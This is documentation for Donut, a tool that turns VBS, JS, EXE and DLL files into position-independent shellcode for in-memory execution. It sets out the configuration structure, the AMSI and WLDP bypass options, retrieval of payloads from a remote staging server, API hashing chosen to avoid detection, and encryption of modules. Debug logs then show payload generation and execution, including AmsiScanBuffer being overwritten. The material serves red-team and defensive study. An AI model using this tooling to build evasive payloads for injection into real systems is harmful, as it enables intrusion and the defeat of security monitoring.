
<html>
<body>

<h3>API</h3>

<ul>
<li><code>int DonutCreate(PDONUT_CONFIG pConfig)</code></li>
<li><code>int DonutDelete(PDONUT_CONFIG pConfig)</code></li>
</ul>

<p>When provided with a valid configuration, <code>DonutCreate</code> will generate a shellcode to execute a VBS/JS/EXE/DLL files in-memory. If the function returns <code>DONUT_ERROR_SUCCESS</code>, the configuration will contain three components:</p>

<ol>
  <li>An encrypted <var>Instance</var></li>
  <li>An encrypted <var>Module</var></li>
  <li>A position-independent code (PIC) or shellcode with <var>Instance</var> embedded in it.</li>
</ol>

<p>The key to decrypt the <var>Module</var> is stored in the <var>Instance</var> so that if a module is discovered on a staging server by an adversary, it should not be possible to decrypt the contents without the instance. <code>DonutDelete</code> will release any memory allocated by a successful call to <code>DonutCreate</code>. The <var>Instance</var> will already be attached to the PIC ready for executing in-memory, but the module may require saving to disk if the PIC will retrieve it from a remote staging server.</p>

<h3>Configuration</h3>

<p>A configuration requires a target architecture (only x86 and x86-64 are currently supported), a path to a VBS/JS/EXE/DLL file that will be executed in-memory by the shellcode, a namespace/class for a .NET assembly, including the name of a method to invoke and any parameters passed to the method. If the module will be stored on a staging server, a URL is required, but not a module name because that will be generated randomly. Unmanaged EXE files can also accept a command line, usually wrapped in quotations.</p>

<pre style='color:#000000;background:#ffffff;'><span style='color:#800000; font-weight:bold; '>typedef</span> <span style='color:#800000; font-weight:bold; '>struct</span> _DONUT_CONFIG <span style='color:#800080; '>{</span>
    <span style='color:#800000; font-weight:bold; '>int</span>             arch<span style='color:#800080; '>;</span>                     <span style='color:#696969; '>// target architecture for shellcode</span>
    <span style='color:#800000; font-weight:bold; '>int</span>             bypass<span style='color:#800080; '>;</span>                   <span style='color:#696969; '>// bypass option for AMSI/WDLP</span>
    <span style='color:#800000; font-weight:bold; '>int</span>             compress<span style='color:#800080; '>;</span>                 <span style='color:#696969; '>// compress file</span>
    <span style='color:#800000; font-weight:bold; '>int</span>             encode<span style='color:#800080; '>;</span>                   <span style='color:#696969; '>// encode shellcode with base64 (also copies to clipboard on windows)</span>
    <span style='color:#800000; font-weight:bold; '>int</span>             thread<span style='color:#800080; '>;</span>                   <span style='color:#696969; '>// run entrypoint of unmanaged EXE as a thread</span>
    <span style='color:#800000; font-weight:bold; '>char</span>            domain<span style='color:#808030; '>[</span>DONUT_MAX_NAME<span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>   <span style='color:#696969; '>// name of domain to create for assembly</span>
    <span style='color:#800000; font-weight:bold; '>char</span>            cls<span style='color:#808030; '>[</span>DONUT_MAX_NAME<span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>      <span style='color:#696969; '>// name of class and optional namespace</span>
    <span style='color:#800000; font-weight:bold; '>char</span>            method<span style='color:#808030; '>[</span>DONUT_MAX_NAME<span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>   <span style='color:#696969; '>// name of method to execute</span>
    <span style='color:#800000; font-weight:bold; '>int</span>             ansi<span style='color:#800080; '>;</span>
    <span style='color:#800000; font-weight:bold; '>char</span>            param<span style='color:#808030; '>[</span>DONUT_MAX_NAME<span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>    <span style='color:#696969; '>// command line to use.</span>
    <span style='color:#800000; font-weight:bold; '>char</span>            file<span style='color:#808030; '>[</span>DONUT_MAX_NAME<span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>     <span style='color:#696969; '>// assembly to create module from   </span>
    <span style='color:#800000; font-weight:bold; '>char</span>            url<span style='color:#808030; '>[</span>DONUT_MAX_URL<span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>       <span style='color:#696969; '>// points to root path of where module will be on remote http server</span>
    <span style='color:#800000; font-weight:bold; '>char</span>            runtime<span style='color:#808030; '>[</span>DONUT_MAX_NAME<span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>  <span style='color:#696969; '>// runtime version to use.</span>
    <span style='color:#800000; font-weight:bold; '>char</span>            modname<span style='color:#808030; '>[</span>DONUT_MAX_NAME<span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>  <span style='color:#696969; '>// name of module written to disk</span>
    
    <span style='color:#800000; font-weight:bold; '>int</span>             mod_type<span style='color:#800080; '>;</span>                 <span style='color:#696969; '>// DONUT_MODULE_DLL or DONUT_MODULE_EXE</span>
    uint64_t        mod_len<span style='color:#800080; '>;</span>                  <span style='color:#696969; '>// size of DONUT_MODULE</span>
    PDONUT_MODULE   mod<span style='color:#800080; '>;</span>                      <span style='color:#696969; '>// points to donut module</span>
     
    <span style='color:#800000; font-weight:bold; '>int</span>             inst_type<span style='color:#800080; '>;</span>                <span style='color:#696969; '>// DONUT_INSTANCE_PIC or DONUT_INSTANCE_URL</span>
    uint64_t        inst_len<span style='color:#800080; '>;</span>                 <span style='color:#696969; '>// size of DONUT_INSTANCE</span>
    PDONUT_INSTANCE inst<span style='color:#800080; '>;</span>                     <span style='color:#696969; '>// points to donut instance</span>
    
    uint64_t        pic_len<span style='color:#800080; '>;</span>                  <span style='color:#696969; '>// size of shellcode</span>
    <span style='color:#800000; font-weight:bold; '>void</span><span style='color:#808030; '>*</span>           pic<span style='color:#800080; '>;</span>                      <span style='color:#696969; '>// points to PIC/shellcode</span>
<span style='color:#800080; '>}</span> DONUT_CONFIG<span style='color:#808030; '>,</span> <span style='color:#808030; '>*</span>PDONUT_CONFIG<span style='color:#800080; '>;</span>
</pre>

<table border="1">
  <tr>
    <th>Member</th>
    <th>Description</th>
  </tr>
  <tr>
    <td><code>arch</code></td>
    <td>Indicates the type of assembly code to generate. <code>DONUT_ARCH_X86</code> and <code>DONUT_ARCH_X64</code> are self-explanatory. <code>DONUT_ARCH_X84</code> indicates dual-mode that combines shellcode for both x86 and amd64. ARM64 will be supported at some point.</td>
  </tr>
  <tr>
    <td><code>bypass</code></td>
    <td>Specifies behaviour of the code responsible for bypassing AMSI and WLDP. The current options are <code>DONUT_BYPASS_SKIP</code> which indicates that no attempt be made to disable AMSI or WLDP. <code>DONUT_BYPASS_ABORT</code> indicates that failure to disable should result in aborting execution of the module. <code>DONUT_BYPASS_CONTINUE</code> indicates that even if AMSI/WDLP bypasses fail, the shellcode will continue with execution.</td>
  </tr>
  <tr>
    <td><code>compress</code></td>
    <td>Module is compressed with the LZ algorithm. Not implemented yet.</td>
  </tr>
  <tr>
    <td><code>encode</code></td>
    <td>Encodes the shellcode using Base64. On windows, the base64 result will be copied to the clipboard.</td>
  </tr>
  <tr>
    <td><code>thread</code></td>
    <td>If the type of file is an unmanaged EXE, this tells donut to run the entrypoint as a thread. It also attempts to intercept calls to ExitProcess via the Import Address Table. However, hooking via IAT is generally unreliable and donut may use code splicing in future.</td>
  </tr>
  <tr>
    <td><code>domain</code></td>
    <td>AppDomain name to create. If one is not specified by the caller, it will be generated randomly.</td>
  </tr>
  <tr>
    <td><code>cls</code></td>
    <td>The class name with method to invoke. A namespace is optional. e.g: <var>namespace.class</var></td>
  </tr>
  <tr>
    <td><code>method</code></td>
    <td>The method that will be invoked by the shellcode once a .NET assembly is loaded into memory. This also holds the name of an exported API if the module is an unmanaged DLL.</td>
  </tr>
  <tr>
    <td><code>ansi</code></td>
    <td>By default, the <code>param</code> string is converted to unicode format. If this is set, the string is not converted. This option only applies to unmanaged DLL/EXE files.</td>
  </tr>
  <tr>
    <td><code>param</code></td>
    <td>Contains a list of parameters for the .NET method or DLL function. Each separated by semi-colon or comma.</td>
  </tr>
  <tr>
    <td><code>file</code></td>
    <td>The path of a supported file type: VBS/JS/EXE/DLL.</td>
  </tr>
  <tr>
    <td><code>url</code></td>
    <td>If the <code>type</code> is <code>DONUT_INSTANCE_URL</code>, this should contain the server and path of where module will be stored. e.g: https://www.rogueserver.com/modules/</td>
  </tr>
  <tr>
    <td><code>runtime</code></td>
    <td>The CLR runtime version to use for the .NET assembly. If none is provided, donut will try read from meta header. If that fails, v4.0.30319 is used by default.</td>
  </tr>
  <tr>
    <td><code>modname</code></td>
    <td>If the <code>type</code> is <code>DONUT_INSTANCE_URL</code>, this will contain a randomly generated name for the module that should be used when saving the contents of <code>mod</code> to disk.</td>
  </tr>
  <tr>
    <td><code>mod_type</code></td>
    <td>Indicates the type of file detected by <code>DonutCreate</code>. For example, <code>DONUT_MODULE_VBS</code> indicates a VBScript file.</td>
  </tr>
  <tr>
    <td><code>mod_len</code></td>
    <td>The total size of the <var>Module</var> pointed to by <code>mod</code>.</td>
  </tr>
  <tr>
    <td><code>mod</code></td>
    <td>Points to encrypted <var>Module</var>. If the <code>type</code> is <code>DONUT_INSTANCE_URL</code>, this should be saved to file using the <code>modname</code> and accessible via HTTP server.</td>
  </tr>
  <tr>
    <td><code>inst_type</code></td>
    <td><code>DONUT_INSTANCE_PIC</code> indicates a self-contained payload which means the .NET assembly is embedded in executable code. <code>DONUT_INSTANCE_URL</code> indicates the .NET assembly is stored on a remote server with a URL embedded in the instance.</td>
  </tr>
  <tr>
    <td><code>inst_len</code></td>
    <td>The total size of the <var>Instance</var> pointed to by <code>inst</code>.</td>
  </tr>
  <tr>
    <td><code>inst</code></td>
    <td>Points to an encrypted <var>Instance</var> after a successful call to <code>DonutCreate</code>. Since it's already attached to the <code>pic</code>, this is only provided for debugging purposes.</td>
  </tr>
  <tr>
    <td><code>pic_len</code></td>
    <td>The size of data pointed to by <code>pic</code>.</td>
  </tr>
  <tr>
    <td><code>pic</code></td>
    <td>Points to executable code for the target architecture which also contains an instance. This should be injected into a remote process.</td>
  </tr>
</table>

<p>Everything that follows here concerns internal workings of Donut and is not required to generate a payload.</p>

<h3>Instance</h3>

<p>The position-independent code will always contain an <var>Instance</var> which can be viewed simply as a configuration for the code itself. It will contain all the data that would normally be stored on the stack or in the <code>.data</code> and <code>.rodata</code> sections of an executable. Once the main code executes, it will decrypt the instance before attempting to resolve the address of API functions. If successful, it will check if an executable file is embedded or must be downloaded from a remote staging server. To verify successful decryption of a module, a randomly generated string stored in the <code>sig</code> field is hashed using <var>Maru</var> and compared with the value of <code>mac</code>.</p>

<h3>Module</h3>

<p>Modules can be embedded in an <var>Instance</var> or stored on a remote HTTP server.</p>

<pre style='color:#000000;background:#ffffff;'><span style='color:#696969; '>// everything required for a module goes in the following structure</span>
<span style='color:#800000; font-weight:bold; '>typedef</span> <span style='color:#800000; font-weight:bold; '>struct</span> _DONUT_MODULE <span style='color:#800080; '>{</span>
    <span style='color:#800000; font-weight:bold; '>int</span>      type<span style='color:#800080; '>;</span>                                   <span style='color:#696969; '>// EXE, DLL, JS, VBS</span>
    <span style='color:#800000; font-weight:bold; '>int</span>      thread<span style='color:#800080; '>;</span>                                 <span style='color:#696969; '>// run entrypoint of unmanaged EXE as thread</span>
    <span style='color:#800000; font-weight:bold; '>char</span>     runtime<span style='color:#808030; '>[</span>DONUT_MAX_NAME<span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>                <span style='color:#696969; '>// runtime version for .NET EXE/DLL</span>
    <span style='color:#800000; font-weight:bold; '>char</span>     domain<span style='color:#808030; '>[</span>DONUT_MAX_NAME<span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>                 <span style='color:#696969; '>// domain name to use for .NET EXE/DLL</span>
    <span style='color:#800000; font-weight:bold; '>char</span>     cls<span style='color:#808030; '>[</span>DONUT_MAX_NAME<span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>                    <span style='color:#696969; '>// name of class and optional namespace for .NET EXE/DLL</span>
    <span style='color:#800000; font-weight:bold; '>char</span>     method<span style='color:#808030; '>[</span>DONUT_MAX_NAME<span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>                 <span style='color:#696969; '>// name of method to invoke for .NET DLL or api for unmanaged DLL</span>
    <span style='color:#800000; font-weight:bold; '>int</span>      ansi<span style='color:#800080; '>;</span>                                   <span style='color:#696969; '>// don't convert command line to unicode</span>
    <span style='color:#800000; font-weight:bold; '>char</span>     param<span style='color:#808030; '>[</span>DONUT_MAX_NAME<span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>                  <span style='color:#696969; '>// string parameters for DLL/EXE</span>
    <span style='color:#800000; font-weight:bold; '>char</span>     sig<span style='color:#808030; '>[</span>DONUT_SIG_LEN<span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>                     <span style='color:#696969; '>// random string to verify decryption</span>
    uint64_t mac<span style='color:#800080; '>;</span>                                    <span style='color:#696969; '>// to verify decryption was ok</span>
    <span style='color:#800000; font-weight:bold; '>int</span>      compressed<span style='color:#800080; '>;</span>                             <span style='color:#696969; '>// indicates module is compressed with LZ algorithm</span>
    uint64_t len<span style='color:#800080; '>;</span>                                    <span style='color:#696969; '>// size of EXE/DLL/JS/VBS file</span>
    uint8_t  data<span style='color:#808030; '>[</span><span style='color:#008c00; '>4</span><span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>                                <span style='color:#696969; '>// data of EXE/DLL/JS/VBS file</span>
<span style='color:#800080; '>}</span> DONUT_MODULE<span style='color:#808030; '>,</span> <span style='color:#808030; '>*</span>PDONUT_MODULE<span style='color:#800080; '>;</span>
</pre>

<h3>API Hashing</h3>

<p>A hash function called <em>Maru</em> is used to resolve the address of API at runtime. It uses a Davies-Meyer construction and the SPECK block cipher to derive a 64-bit hash from an API string. The padding is similar to what's used by MD4 and MD5 except only 32-bits of the string length are stored in the buffer instead of 64-bits. An initial value (IV) chosen randomly ensures the 64-bit API hashes are unique for each instance and cannot be used for detection of Donut. Future releases will likely support alternative methods of resolving address of API to decrease chance of detection.</p>

<h3>Encryption</h3>

<p>The following structure is used to hold a master key, counter and nonce for Donut, which are generated randomly.</p>

<pre style='color:#000000;background:#ffffff;'><span style='color:#800000; font-weight:bold; '>typedef</span> <span style='color:#800000; font-weight:bold; '>struct</span> _DONUT_CRYPT <span style='color:#800080; '>{</span>
    <span style='color:#603000; '>BYTE</span>    mk<span style='color:#808030; '>[</span>DONUT_KEY_LEN<span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>   <span style='color:#696969; '>// master key</span>
    <span style='color:#603000; '>BYTE</span>    ctr<span style='color:#808030; '>[</span>DONUT_BLK_LEN<span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>  <span style='color:#696969; '>// counter + nonce</span>
<span style='color:#800080; '>}</span> DONUT_CRYPT<span style='color:#808030; '>,</span> <span style='color:#808030; '>*</span>PDONUT_CRYPT<span style='color:#800080; '>;</span>
</pre>

<p>Chaskey, a 128-bit block cipher with support for 128-bit keys, is used in Counter (CTR) mode to decrypt a <var>Module</var> or an <var>Instance</var> at runtime. If an adversary discovers a staging server, it should not be feasible for them to decrypt a donut module without the key which is stored in the donut payload. </p>

<h3>Debugging payload</h3>

<p>The payload is capable of displaying detailed information about each step executing a file in-memory and can be useful in tracking down bugs. To build a debug-enabled executable, specify the debug label with nmake/make for both donut.c and payload.c.</p>

<pre>
nmake debug -f Makefile.msvc
make debug -f Makefile.mingw
</pre>

<p>Use donut to create a payload as you normally would and a file called <code>instance</code> will be saved to disk.</p> 

<pre>
c:\hub\donut>donut -fClass1.dll -cTestClass -mRunProcess -pcalc.exe,notepad.exe

  [ Donut shellcode generator v0.9.2
  [ Copyright (c) 2019 TheWover, Odzhan

DEBUG: donut.c:822:DonutCreate(): Entering.
DEBUG: donut.c:824:DonutCreate(): Validating configuration and path of file
DEBUG: donut.c:840:DonutCreate(): Validating instance type
DEBUG: donut.c:880:DonutCreate(): Validating architecture
DEBUG: donut.c:277:get_file_info(): Entering.
DEBUG: donut.c:286:get_file_info(): Checking extension of Class1.dll
DEBUG: donut.c:293:get_file_info(): Extension is ".dll"
DEBUG: donut.c:320:get_file_info(): Module is DLL
DEBUG: donut.c:327:get_file_info(): Mapping Class1.dll into memory
DEBUG: donut.c:222:map_file(): Reading size of file : Class1.dll
DEBUG: donut.c:231:map_file(): Opening Class1.dll
DEBUG: donut.c:241:map_file(): Mapping 3072 bytes for Class1.dll
DEBUG: donut.c:336:get_file_info(): Checking DOS header
DEBUG: donut.c:342:get_file_info(): Checking NT header
DEBUG: donut.c:348:get_file_info(): Checking IMAGE_DATA_DIRECTORY
DEBUG: donut.c:356:get_file_info(): Checking characteristics
DEBUG: donut.c:368:get_file_info(): COM Directory found
DEBUG: donut.c:384:get_file_info(): Runtime version : v4.0.30319
DEBUG: donut.c:395:get_file_info(): Leaving.
DEBUG: donut.c:944:DonutCreate(): Creating module
DEBUG: donut.c:516:CreateModule(): Entering.
DEBUG: donut.c:520:CreateModule(): Allocating 9504 bytes of memory for DONUT_MODULE
DEBUG: donut.c:544:CreateModule(): Domain  : TPYTXT7T
DEBUG: donut.c:549:CreateModule(): Class   : TestClass
DEBUG: donut.c:552:CreateModule(): Method  : RunProcess
DEBUG: donut.c:559:CreateModule(): Runtime : v4.0.30319
DEBUG: donut.c:584:CreateModule(): Adding "calc.exe"
DEBUG: donut.c:584:CreateModule(): Adding "notepad.exe"
DEBUG: donut.c:610:CreateModule(): Leaving.
DEBUG: donut.c:951:DonutCreate(): Creating instance
DEBUG: donut.c:621:CreateInstance(): Entering.
DEBUG: donut.c:624:CreateInstance(): Allocating space for instance
DEBUG: donut.c:631:CreateInstance(): The size of module is 9504 bytes. Adding to size of instance.
DEBUG: donut.c:643:CreateInstance(): Generating random key for instance
DEBUG: donut.c:649:CreateInstance(): Generating random key for module
DEBUG: donut.c:655:CreateInstance(): Generating random string to verify decryption
DEBUG: donut.c:661:CreateInstance(): Generating random IV for Maru hash
DEBUG: donut.c:666:CreateInstance(): Generating hashes for API using IV: 59e4ea34bad26f10
DEBUG: donut.c:679:CreateInstance(): Hash for kernel32.dll    : LoadLibraryA           = 710C9DA8846AE821
DEBUG: donut.c:679:CreateInstance(): Hash for kernel32.dll    : GetProcAddress         = 2334B1630D3B9C85
DEBUG: donut.c:679:CreateInstance(): Hash for kernel32.dll    : GetModuleHandleA       = 5389E01382E0391
DEBUG: donut.c:679:CreateInstance(): Hash for kernel32.dll    : VirtualAlloc           = 51EE6B0DB215095E
DEBUG: donut.c:679:CreateInstance(): Hash for kernel32.dll    : VirtualFree            = F55A2169F30A6ED4
DEBUG: donut.c:679:CreateInstance(): Hash for kernel32.dll    : VirtualQuery           = 22DB7628044F6E32
DEBUG: donut.c:679:CreateInstance(): Hash for kernel32.dll    : VirtualProtect         = 688AA07FEF250016
DEBUG: donut.c:679:CreateInstance(): Hash for kernel32.dll    : Sleep                  = 5BF1C1B408CCA4A5
DEBUG: donut.c:679:CreateInstance(): Hash for kernel32.dll    : MultiByteToWideChar    = 438AD242BBBC755
DEBUG: donut.c:679:CreateInstance(): Hash for kernel32.dll    : GetUserDefaultLCID     = 33ED1B2C1A2F9EC7
DEBUG: donut.c:679:CreateInstance(): Hash for oleaut32.dll    : SafeArrayCreate        = 78AD2BFB55A5E7ED
DEBUG: donut.c:679:CreateInstance(): Hash for oleaut32.dll    : SafeArrayCreateVector  = 539F6582DE26F7BC
DEBUG: donut.c:679:CreateInstance(): Hash for oleaut32.dll    : SafeArrayPutElement    = 5057AD641F749DA0
DEBUG: donut.c:679:CreateInstance(): Hash for oleaut32.dll    : SafeArrayDestroy       = A63C510FF032080E
DEBUG: donut.c:679:CreateInstance(): Hash for oleaut32.dll    : SafeArrayGetLBound     = A37979CE2EEDDA6
DEBUG: donut.c:679:CreateInstance(): Hash for oleaut32.dll    : SafeArrayGetUBound     = 64A9C62452B8653C
DEBUG: donut.c:679:CreateInstance(): Hash for oleaut32.dll    : SysAllocString         = BFEEAAB6CE6017FB
DEBUG: donut.c:679:CreateInstance(): Hash for oleaut32.dll    : SysFreeString          = E6FD34B03A2701F6
DEBUG: donut.c:679:CreateInstance(): Hash for oleaut32.dll    : LoadTypeLib            = 2A33214873ADC58C
DEBUG: donut.c:679:CreateInstance(): Hash for wininet.dll     : InternetCrackUrlA      = 1ADE3553184C68E1
DEBUG: donut.c:679:CreateInstance(): Hash for wininet.dll     : InternetOpenA          = 1DEDE3D32F2FCD3
DEBUG: donut.c:679:CreateInstance(): Hash for wininet.dll     : InternetConnectA       = 781FD6B18C99CAD2
DEBUG: donut.c:679:CreateInstance(): Hash for wininet.dll     : InternetSetOptionA     = 13EC8A292778FC3F
DEBUG: donut.c:679:CreateInstance(): Hash for wininet.dll     : InternetReadFile       = 8D16E60E7C2E582A
DEBUG: donut.c:679:CreateInstance(): Hash for wininet.dll     : InternetCloseHandle    = C28E8A3AABB2A755
DEBUG: donut.c:679:CreateInstance(): Hash for wininet.dll     : HttpOpenRequestA       = 6C5189610A8545F5
DEBUG: donut.c:679:CreateInstance(): Hash for wininet.dll     : HttpSendRequestA       = 4DFA0D985988D31
DEBUG: donut.c:679:CreateInstance(): Hash for wininet.dll     : HttpQueryInfoA         = ED09A37256B27F04
DEBUG: donut.c:679:CreateInstance(): Hash for mscoree.dll     : CorBindToRuntime       = FD669FABED4C6B7
DEBUG: donut.c:679:CreateInstance(): Hash for mscoree.dll     : CLRCreateInstance      = 56B7AC5C110570B5
DEBUG: donut.c:679:CreateInstance(): Hash for ole32.dll       : CoInitializeEx         = 3733F4734D12D7C
DEBUG: donut.c:679:CreateInstance(): Hash for ole32.dll       : CoCreateInstance       = FCB3EAC51E43319B
DEBUG: donut.c:679:CreateInstance(): Hash for ole32.dll       : CoUninitialize         = 908A347B45C6E4A2
DEBUG: donut.c:694:CreateInstance(): Copying GUID structures and DLL strings for loading .NET assemblies
DEBUG: donut.c:791:CreateInstance(): Copying module data to instance
DEBUG: donut.c:796:CreateInstance(): encrypting instance
DEBUG: donut.c:808:CreateInstance(): Leaving.
DEBUG: donut.c:959:DonutCreate(): Saving instance to file
DEBUG: donut.c:992:DonutCreate(): PIC size : 33050
DEBUG: donut.c:999:DonutCreate(): Inserting opcodes
DEBUG: donut.c:1035:DonutCreate(): Copying 15218 bytes of x86 + amd64 shellcode
DEBUG: donut.c:259:unmap_file(): Unmapping
DEBUG: donut.c:262:unmap_file(): Closing
DEBUG: donut.c:1061:DonutCreate(): Leaving.
  [ Instance type : PIC
  [ Module file   : "Class1.dll"
  [ File type     : .NET DLL
  [ Class         : TestClass
  [ Method        : RunProcess
  [ Parameters    : calc.exe,notepad.exe
  [ Target CPU    : x86+AMD64
  [ Shellcode     : "payload.bin"

DEBUG: donut.c:1069:DonutDelete(): Entering.
DEBUG: donut.c:1088:DonutDelete(): Leaving.
</pre>

<p>Pass the instance as a parameter to payload.exe and it will run on the host system as if in a target environment.</p>

<pre>
c:\hub\donut\payload>payload ..\instance
Running...
DEBUG: payload.c:45:ThreadProc(): Maru IV : 1899033E0863343E
DEBUG: payload.c:48:ThreadProc(): Resolving address for VirtualAlloc() : 9280348A6A2AFA7
DEBUG: payload.c:52:ThreadProc(): Resolving address for VirtualAlloc() : 3A49032E4107D985
DEBUG: payload.c:61:ThreadProc(): VirtualAlloc : 77535ED0 VirtualFree : 77535EF0
DEBUG: payload.c:63:ThreadProc(): Allocating 17800 bytes of RW memory
DEBUG: payload.c:70:ThreadProc(): Copying 17800 bytes of data to memory 008D0000
DEBUG: payload.c:74:ThreadProc(): Zero initializing PDONUT_ASSEMBLY
DEBUG: payload.c:82:ThreadProc(): Decrypting 17800 bytes of instance
DEBUG: payload.c:89:ThreadProc(): Generating hash to verify decryption
DEBUG: payload.c:91:ThreadProc(): Instance : c16c69caa83fb13f | Result : c16c69caa83fb13f
DEBUG: payload.c:98:ThreadProc(): Resolving LoadLibraryA
DEBUG: payload.c:104:ThreadProc(): Loading ole32.dll ...
DEBUG: payload.c:104:ThreadProc(): Loading oleaut32.dll ...
DEBUG: payload.c:104:ThreadProc(): Loading wininet.dll ...
DEBUG: payload.c:104:ThreadProc(): Loading mscoree.dll ...
DEBUG: payload.c:108:ThreadProc(): Resolving 33 API
DEBUG: payload.c:111:ThreadProc(): Resolving API address for 066A0ED9815D3C92
DEBUG: payload.c:111:ThreadProc(): Resolving API address for F3569749C64E1DA5
DEBUG: payload.c:111:ThreadProc(): Resolving API address for 09280348A6A2AFA7
DEBUG: payload.c:111:ThreadProc(): Resolving API address for 3A49032E4107D985
DEBUG: payload.c:111:ThreadProc(): Resolving API address for FDE50FEB629EB834
DEBUG: payload.c:111:ThreadProc(): Resolving API address for 4A4C764EFA89A84F
DEBUG: payload.c:111:ThreadProc(): Resolving API address for 5D388BA18E017E53
DEBUG: payload.c:111:ThreadProc(): Resolving API address for 4EA2B25D8FAABD2B
DEBUG: payload.c:111:ThreadProc(): Resolving API address for F1D278132E49F050
DEBUG: payload.c:111:ThreadProc(): Resolving API address for D05386A0F8FF7CAD
DEBUG: payload.c:111:ThreadProc(): Resolving API address for 8121B63764A390A6
DEBUG: payload.c:111:ThreadProc(): Resolving API address for EB2BFAA408124470
DEBUG: payload.c:111:ThreadProc(): Resolving API address for 11B666F77E7303F6
DEBUG: payload.c:111:ThreadProc(): Resolving API address for E8BD6B7A99981E38
DEBUG: payload.c:111:ThreadProc(): Resolving API address for DE78E211DE61998B
DEBUG: payload.c:111:ThreadProc(): Resolving API address for 09D967C5479A0F9F
DEBUG: payload.c:111:ThreadProc(): Resolving API address for 6CA1D167C2BFFA9A
DEBUG: payload.c:111:ThreadProc(): Resolving API address for AD11F6324A205C5E
DEBUG: payload.c:111:ThreadProc(): Resolving API address for 5EAEF345362A2811
DEBUG: payload.c:111:ThreadProc(): Resolving API address for A0CC0DC36E8EDD2C
DEBUG: payload.c:111:ThreadProc(): Resolving API address for A4241EDCC8B14F85
DEBUG: payload.c:111:ThreadProc(): Resolving API address for 756CEB8FF481A72E
DEBUG: payload.c:111:ThreadProc(): Resolving API address for 8116A255193A09CA
DEBUG: payload.c:111:ThreadProc(): Resolving API address for AB14A786531404A1
DEBUG: payload.c:111:ThreadProc(): Resolving API address for 1CF4A93D6896380A
DEBUG: payload.c:111:ThreadProc(): Resolving API address for 61B393CC2DE33733
DEBUG: payload.c:111:ThreadProc(): Resolving API address for ADAF62D44179684A
DEBUG: payload.c:111:ThreadProc(): Resolving API address for 7F9591B7380CD749
DEBUG: payload.c:111:ThreadProc(): Resolving API address for 3CC76B29D676544F
DEBUG: payload.c:111:ThreadProc(): Resolving API address for 725AA978FD2B1255
DEBUG: peb.c:87:FindExport(): 725aa978fd2b1255 is forwarded to api-ms-win-core-com-l1-1-0.CoInitializeEx
DEBUG: peb.c:110:FindExport(): Trying to load api-ms-win-core-com-l1-1-0.dll
DEBUG: peb.c:114:FindExport(): Calling GetProcAddress(CoInitializeEx)
DEBUG: payload.c:111:ThreadProc(): Resolving API address for 6C0F670F3C85A407
DEBUG: peb.c:87:FindExport(): 6c0f670f3c85a407 is forwarded to api-ms-win-core-com-l1-1-0.CoCreateInstance
DEBUG: peb.c:110:FindExport(): Trying to load api-ms-win-core-com-l1-1-0.dll
DEBUG: peb.c:114:FindExport(): Calling GetProcAddress(CoCreateInstance)
DEBUG: payload.c:111:ThreadProc(): Resolving API address for 2996694CA69B44E8
DEBUG: peb.c:87:FindExport(): 2996694ca69b44e8 is forwarded to api-ms-win-core-com-l1-1-0.CoUninitialize
DEBUG: peb.c:110:FindExport(): Trying to load api-ms-win-core-com-l1-1-0.dll
DEBUG: peb.c:114:FindExport(): Calling GetProcAddress(CoUninitialize)
DEBUG: payload.c:127:ThreadProc(): Using module embedded in instance
DEBUG: inmem_dotnet.c:43:LoadAssembly(): Using module embedded in instance
DEBUG: inmem_dotnet.c:51:LoadAssembly(): CLRCreateInstance
DEBUG: inmem_dotnet.c:59:LoadAssembly(): ICLRMetaHost::GetRuntime("v4.0.30319")
DEBUG: inmem_dotnet.c:66:LoadAssembly(): ICLRRuntimeInfo::IsLoadable
DEBUG: inmem_dotnet.c:70:LoadAssembly(): ICLRRuntimeInfo::GetInterface
DEBUG: inmem_dotnet.c:78:LoadAssembly(): HRESULT: 00000000
DEBUG: inmem_dotnet.c:100:LoadAssembly(): ICorRuntimeHost::Start
DEBUG: inmem_dotnet.c:107:LoadAssembly(): ICorRuntimeHost::CreateDomain("TP7WFT9M")
DEBUG: inmem_dotnet.c:115:LoadAssembly(): IUnknown::QueryInterface
DEBUG: bypass.c:83:DisableAMSI(): Length of AmsiScanBuffer stub is 32 bytes.
DEBUG: bypass.c:89:DisableAMSI(): Overwriting AmsiScanBuffer
DEBUG: bypass.c:104:DisableAMSI(): Length of AmsiScanString stub is -16 bytes.
DEBUG: inmem_dotnet.c:123:LoadAssembly(): DisableAMSI OK
DEBUG: inmem_dotnet.c:127:LoadAssembly(): DisableWLDP OK
DEBUG: inmem_dotnet.c:134:LoadAssembly(): Copying 3072 bytes of assembly to safe array
DEBUG: inmem_dotnet.c:140:LoadAssembly(): AppDomain::Load_3
DEBUG: inmem_dotnet.c:147:LoadAssembly(): HRESULT : 00000000
DEBUG: inmem_dotnet.c:149:LoadAssembly(): Erasing assembly from memory
DEBUG: inmem_dotnet.c:155:LoadAssembly(): SafeArrayDestroy
DEBUG: inmem_dotnet.c:176:RunAssembly(): Using module embedded in instance
DEBUG: inmem_dotnet.c:184:RunAssembly(): Type is DLL
DEBUG: inmem_dotnet.c:255:RunAssembly(): SysAllocString("TestClass")
DEBUG: inmem_dotnet.c:259:RunAssembly(): SysAllocString("RunProcess")
DEBUG: inmem_dotnet.c:263:RunAssembly(): Assembly::GetType_2
DEBUG: inmem_dotnet.c:269:RunAssembly(): SafeArrayCreateVector(2 parameter(s))
DEBUG: inmem_dotnet.c:276:RunAssembly(): Adding "calc.exe" as parameter 1
DEBUG: inmem_dotnet.c:276:RunAssembly(): Adding "notepad.exe" as parameter 2
DEBUG: inmem_dotnet.c:292:RunAssembly(): Calling Type::InvokeMember_3
DEBUG: inmem_dotnet.c:306:RunAssembly(): Type::InvokeMember_3 : 00000000 : Success
DEBUG: inmem_dotnet.c:323:FreeAssembly(): Type::Release
